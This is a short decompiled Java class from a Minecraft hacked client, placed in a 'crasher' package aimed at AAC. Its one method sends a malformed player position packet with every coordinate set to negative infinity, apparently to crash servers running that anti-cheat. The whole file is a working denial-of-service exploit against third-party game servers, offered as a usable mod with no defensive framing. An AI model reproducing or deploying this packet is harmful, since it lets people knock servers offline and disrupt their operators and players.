// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.aac;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class AacCrasher1
{
    public static void start() {
        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
    }
}
